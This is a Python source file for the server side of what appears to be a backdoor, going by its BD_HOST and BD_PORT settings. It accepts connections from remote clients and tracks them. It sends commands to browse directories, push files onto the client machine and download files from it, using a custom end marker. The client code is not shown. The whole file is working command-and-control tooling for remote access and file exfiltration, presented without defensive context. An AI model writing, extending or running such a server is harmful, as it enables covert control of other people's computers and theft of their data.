import io
import socket
import os
import time
from threading import Thread

import models

HOST = str(os.environ.get("BD_HOST"))
PORT = int(os.environ.get("BD_PORT"))
# create socket instance
server_socket = socket.socket()
# bind the instance to given Host and Port
server_socket.bind((HOST, PORT))
print('[+] Server Started')
# list where all connected clients are stored in
clients = []
server_socket.listen(5)


# function to handle user command and sending them to a client
def handle_command(userinput, client):
    command = userinput.split(" ")[0]
    cl = client.socket
    output = ""
    args = userinput.split(" ")
    del (args[0])

    if command == "cd":
        if len(args) > 0:
            cl.send(userinput.encode("UTF-8"))
            output = cl.recv(1024).decode()
            if not output == "Invalid Path!":
                client.pwd = output
        else:
            output = "No args given!"

    elif command == 'pwd':
        return client.pwd

    elif command == "ls":
        cl.send(userinput.encode("UTF-8"))
        output = cl.recv(1024)
        output = output.decode()

    elif command == "send":
        # check if args are given
        if len(args) > 0:
            # check if there is a file with the given name
            if not client.get_file_by_name(args[0]) is None:
                # valid input the command is ready to be executed and send to the client
                cl.send(userinput.encode("UTF-8"))
                # necessary because otherwise the filedata is transmitted with the command --> client side handles
                # the command wrong
                # So the thread waits 5 seconds so the command is safely send
                time.sleep(5)

                file = client.get_file_by_name(args[0])
                # then the file data is transmitted
                cl.sendall(file.data.getvalue())
                # closing tag so the client knows when the file bytes end
                # (idea from: https://www.youtube.com/watch?v=qFVoMo6OMsQ&t=385s)
                cl.send(b"<END>")
                output = cl.recv(1024).decode()
            else:
                output = "File not found!"
        else:
            output = "No args given!"

    elif command == "download":
        # check if args are given
        if len(args) > 0:
            cl.send(userinput.encode("UTF-8"))
            # valid is yes when the given path exists on the client and there is a file to download
            # no is conditions are not satisfied
            valid = cl.recv(1024).decode()
            if valid == "yes":
                file_name = args[0]
                # creating byte stream where received files are appended to
                file_bytes = b""
                done = False
                # while loop to accept byte packages as long as not all the files data is transmitted
                while not done:
                    data = cl.recv(1024)
                    # append data to the total files_bytes
                    file_bytes += data
                    # checking if the end is reached and the loop should end
                    if file_bytes[-5:] == b"<END>":
                        done = True
                final_bytes = file_bytes[:-5]
                # creating file instance from byte stream
                file = io.BytesIO(final_bytes)
                file.seek(0)
                # returning name for the file and the file itself with its data
                return file_name, file
            else:
                output = "File not found!"
        else:
            output = "No args given!"

    else:
        output = "Unknown command! (help for help)"

    return output


# function to run in background and constantly listen for incoming clients
def listen_for_clients():
    print("[+] Listening for Connections!")
    while True:
        client, client_addr = server_socket.accept()
        print(f'[+] {client_addr} Client connected to the server')
        pwd = client.recv(1024).decode()
        # client is being accepted and Client instance is created with all the data
        c = models.Client(pwd, client_addr, client)
        # client added to the list
        clients.append(c)


def is_client_connected(client):
    try:
        # Attempt to send a small piece of data to the client
        client.sendall(b'Ping')
        return True
    except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
        # Client socket is no longer active
        return False
